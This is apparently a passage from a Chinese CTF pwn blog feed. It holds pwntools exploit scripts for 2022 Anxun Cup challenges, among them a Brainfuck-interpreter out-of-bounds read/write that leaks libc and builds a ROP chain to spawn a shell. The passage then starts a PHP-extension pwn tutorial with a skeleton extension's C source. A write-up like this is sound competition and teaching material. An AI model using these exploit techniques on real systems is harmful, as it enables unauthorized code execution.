class="number">0x2c</span>+p32(popr1)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(puts_got)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">rop1+=p32(puts_plt)+p32(movr0)+p32(mainaddr)*<span class="number">10</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;comment&gt;&quot;</span>,rop1)</span><br><span class="line">data = p.recvline()</span><br><span class="line">libc_base = u32(data[<span class="number">1</span>:<span class="number">5</span>]) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(data)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh)</span><br><span class="line"><span class="comment">#attack ret addr-----&gt;system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">rop2=p32(popr1)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(popr2)</span><br><span class="line">rop2+=p32(system)+p32(movr0)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;msg&gt;&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x2c</span>+rop2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>##babybf:<br>此题是继qwnt做出的第二个Brainfuck解释器PWN题，它有一套自己的符号，类似于vm，也算一个vm题，通过移动指针来进行越界写和越界读，这题就是通过移动指针来越界读和越界写，来列举下breainfuckf</p><pre><code>| Brainfuck | C                                                            || --------- | ------------------------------------------------------------ || &gt;         | ++ptr;                                                       || &lt;         | --ptr;                                                       || +         | ++*ptr;                                                      || -         | --*ptr;                                                      || .         | putchar(*ptr); || ,         | *ptr =getch();                                               || [         | while (*ptr) &#123;                                               || ]         | &#125;                                                            |</code></pre><p>通过&gt;移动87位置泄露libc，再次通过&gt;移动56次来劫持返回地址rop即可<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;47.108.29.107&#x27;</span>,<span class="number">10472</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/roo/Desktop/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendcode</span>(<span class="params">length,code</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;len&gt; &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;code&gt; &quot;</span>,code)</span><br><span class="line"><span class="comment">#pay=&quot;&gt;&quot;</span></span><br><span class="line">pay=<span class="string">&quot;&gt;&quot;</span>*<span class="number">87</span></span><br><span class="line">pay+=<span class="string">&quot;&gt;.&quot;</span>*<span class="number">9</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sendcode(<span class="built_in">len</span>(pay),pay)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21b97</span>-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libcbase)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rce1=libcbase+<span class="number">0x10a2fc</span></span><br><span class="line">rce2=libcbase+<span class="number">0x4f322</span></span><br><span class="line">rce3=libcbase+<span class="number">0x10a38c</span></span><br><span class="line">poprdi=libcbase+<span class="number">0x000000000002164f</span></span><br><span class="line">poprsi=libcbase+<span class="number">0x0000000000023a6a</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(rce1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rce1)</span><br><span class="line"><span class="comment"># rce_1=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_2=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_3=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_4=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_5=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_6=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_7=rce1&amp;0xff</span></span><br><span class="line">pay2=<span class="string">&quot;-&quot;</span>*<span class="number">40</span></span><br><span class="line"><span class="comment">#pay2+=&quot;,&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sendcode(<span class="built_in">len</span>(pay2),pay2)</span><br><span class="line">pay3=<span class="string">&quot;&gt;&quot;</span>*<span class="number">56</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">sendcode(<span class="built_in">len</span>(pay3),pay3)</span><br><span class="line">rop=p64(libcbase+<span class="number">0x000000000002155f</span>)+p64(binsh)+p64(system)</span><br><span class="line">p.send(p64(libcbase+<span class="number">0x00000000000008aa</span>))</span><br><span class="line">p.send(p64(libcbase+<span class="number">0x000000000002164f</span>))</span><br><span class="line">p.send(p64(binsh))</span><br><span class="line">p.send(p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022安洵杯-CTF-PWN-wp&quot;&gt;&lt;a href=&quot;#2022安洵杯-CTF-PWN-wp&quot; class=&quot;headerlink&quot; title=&quot;2022安洵杯 CTF PWN wp&quot;&gt;&lt;/a&gt;2022安洵杯 CTF PWN wp&lt;/h1&gt;&lt;p&gt;##前言：上</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>非常规PWN</title>
    <link href="https://jsjsj.top/2022/10/03/%E9%9D%9E%E5%B8%B8%E8%A7%84PWN/"/>
    <id>https://jsjsj.top/2022/10/03/%E9%9D%9E%E5%B8%B8%E8%A7%84PWN/</id>
    <published>2022-10-03T14:13:56.000Z</published>
    <updated>2023-10-03T14:30:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="非常规PWN-Web-pwn-一"><a href="#非常规PWN-Web-pwn-一" class="headerlink" title="非常规PWN&amp;Web pwn(一)"></a>非常规PWN&amp;Web pwn(一)</h1><h3 id="前言：最近在学非常规pwn，然后想到了之前的php-pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web-php-pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里"><a href="#前言：最近在学非常规pwn，然后想到了之前的php-pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web-php-pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里" class="headerlink" title="前言：最近在学非常规pwn，然后想到了之前的php pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web(php) pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里"></a>前言：最近在学非常规pwn，然后想到了之前的php pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web(php) pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里</h3><h2 id="php-环境搭建"><a href="#php-环境搭建" class="headerlink" title="php 环境搭建"></a>php 环境搭建</h2><p>第一步我们需要在Ubuntu里安装个php的环境。命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.2 </span><br><span class="line">sudo apt install php-dev</span><br></pre></td></tr></table></figure><p>这里我下载的是php7.2环境，因为题目环境php版本也是这个版本，然后去找到对应的源码编译下源码，源码推荐：<a href="https://www.php.net/downloads.php">https://www.php.net/downloads.php</a>   <a href="https://www.php.net/distributions/php-7.2.31.tar.xz">https://www.php.net/distributions/php-7.2.31.tar.xz</a></p><p>然后我们看下源码的目录，每个目录的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. build 和编译有关的目录。</span><br><span class="line">2. ext 扩展库代码，例如 MySQL、zlib、iconv 等我们熟悉的扩展库。其中/ext/standard/ 目录下是常用的标准函数集。</span><br><span class="line">3. main 主目录包含主要的 PHP 宏和定义。</span><br><span class="line">4. sapi 和各种服务器的接口调用，例如apache、IIS等，也包含一般的fastcgi、cgi等。</span><br><span class="line">5. win32 和 Windows 下编译 PHP 有关的脚本。</span><br><span class="line">6. Zend 文件夹核心的引擎，所有的 Zend API 定义与宏等。</span><br><span class="line">7. scripts Linux 下的脚本目录。</span><br><span class="line">8. tests 测试脚本目录</span><br><span class="line">9. sapi 各类 Web 服务器的接口。</span><br><span class="line">10.TSRM Zend 和 PHP 的 “线程安全资源管理器” (TSRM) 目录。</span><br><span class="line">11.pear 这个目录就是“PHP 扩展与应用仓库”的目录。包含了PEAR 的核心文件。</span><br></pre></td></tr></table></figure><p>然后我们要想自己编译的话，在ext目录里进行编译</p><p>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=webpwn  #自己编译了个拓展库 webpwn</span><br></pre></td></tr></table></figure><p>然后进到相应目录里，我们看下webpwn.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | PHP Version 7                                                        |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | Copyright (c) 1997-2018 The PHP Group                                |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | This source file is subject to version 3.01 of the PHP license,      |</span></span><br><span class="line"><span class="comment">  | that is bundled with this package in the file LICENSE, and is        |</span></span><br><span class="line"><span class="comment">  | available through the world-wide-web at the following url:           |</span></span><br><span class="line"><span class="comment">  | http://www.php.net/license/3_01.txt                                  |</span></span><br><span class="line"><span class="comment">  | If you did not receive a copy of the PHP license and are unable to   |</span></span><br><span class="line"><span class="comment">  | obtain it through the world-wide-web, please send a note to          |</span></span><br><span class="line"><span class="comment">  | license@php.net so we can mail you a copy immediately.               |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | Author:                                                              |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $Id$ */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_ini.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_webpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* If you declare any globals in php_webpwn.h uncomment this:</span></span><br><span class="line"><span class="comment">ZEND_DECLARE_MODULE_GLOBALS(webpwn)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* True global resources - no need for thread safety here */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> le_webpwn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_INI</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* Remove comments and fill if you need to have entries in php.ini</span></span><br><span class="line"><span class="comment">PHP_INI_BEGIN()</span></span><br><span class="line"><span class="comment">    STD_PHP_INI_ENTRY(&quot;webpwn.global_value&quot;,      &quot;42&quot;, PHP_INI_ALL, OnUpdateLong, global_value, zend_webpwn_globals, webpwn_globals)</span></span><br><span class="line"><span class="comment">    STD_PHP_INI_ENTRY(&quot;webpwn.global_string&quot;, &quot;foobar&quot;, PHP_INI_ALL, OnUpdateString, global_string, zend_webpwn_globals, webpwn_globals)</span></span><br><span class="line"><span class="comment">PHP_INI_END()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove the following function when you have successfully modified config.m4</span></span><br><span class="line"><span class="comment">   so that your module can be compiled into PHP, it exists only for testing</span></span><br><span class="line"><span class="comment">   purposes. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Every user-visible function in PHP should document itself in the source */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string confirm_webpwn_compiled(string arg)</span></span><br><span class="line"><span class="comment">   Return a string to confirm that the module is compiled in */</span></span><br><span class="line">PHP_FUNCTION(confirm_webpwn_compiled)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> arg_len, len;</span><br><span class="line">zend_string *strg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strg = strpprintf(<span class="number">0</span>, <span class="string">&quot;Congratulations! You have successfully modified ext/%.78s/config.m4. Module %.78s is now compiled into PHP.&quot;</span>, <span class="string">&quot;webpwn&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">RETURN_STR(strg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="comment">/* The previous line is meant for vim and emacs, so it can correctly fold and</span></span><br><span class="line"><span class="comment">   unfold functions in source code. See the corresponding marks just before</span></span><br><span class="line"><span class="comment">   function definition, where the functions purpose is also documented. Please</span></span><br><span class="line"><span class="comment">   follow this convention for the convenience of others editing your code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; php_webpwn_init_globals</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* Uncomment this function if you have INI entries</span></span><br><span class="line"><span class="comment">static void php_webpwn_init_globals(zend_webpwn_globals *webpwn_globals)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">webpwn_globals-&gt;global_value = 0;</span></span><br><span class="line"><span class="comment">webpwn_globals-&gt;global_string = NULL;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINIT_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* If you have INI entries, uncomment these lines</span></span><br><span class="line"><span class="comment">REGISTER_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MSHUTDOWN_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MSHUTDOWN_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* uncomment this line if you have INI entries</span></span><br><span class="line"><span class="comment">UNREGISTER_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove if there&#x27;s nothing to do at request start */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(COMPILE_DL_WEBPWN) &amp;&amp; defined(ZTS)</span></span><br><span class="line">ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove if there&#x27;s nothing to do at request end */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RSHUTDOWN_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RSHUTDOWN_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line">php_info_print_table_start();</span><br><span class="line">php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;webpwn support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">php_info_print_table_end();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove comments if you have entries in php.ini</span></span><br><span class="line"><span class="comment">DISPLAY_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; webpwn_functions[]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Every user visible function must have an entry in webpwn_functions[].</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> zend_function_entry webpwn_functions[] = &#123;</span><br><span class="line">PHP_FE(confirm_webpwn_compiled,<span class="literal">NULL</span>)<span class="comment">/* For testing, remove later. */</span></span><br><span class="line">PHP_FE_END<span class="comment">/* Must be the last line in webpwn_functions[] */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; webpwn_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry webpwn_module_entry = &#123;</span><br><span class="line">STANDARD_MODULE_HEADER,</span><br><span class="line"><span class="string">&quot;webpwn&quot;</span>,</span><br><span class="line">webpwn_functions,</span><br><span class="line">PHP_MINIT(webpwn),</span><br><span class="line">PHP_MSHUTDOWN(webpwn),</span><br><span class="line">PHP_RINIT(webpwn),<span class="comment">/* Replace with NULL if there&#x27;s nothing to do at request start */</span></span><br><span class="line">PHP_RSHUTDOWN(webpwn),<span class="comment">/* Replace with NULL if there&#x27;s nothing to do at request end */</span></span><br><span class="line">PHP_MINFO(webpwn),</span><br><span class="line">PHP_WEBPWN_VERSION,</span><br><span class="line">STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_DL_WEBPWN</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(webpwn)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Local variables:</span></span><br><span class="line"><span class="comment"> * tab-width: 4</span></span><br><span class="line"><span class="comment"> * c-basic-offset: 4</span></span><br><span class="line"><span 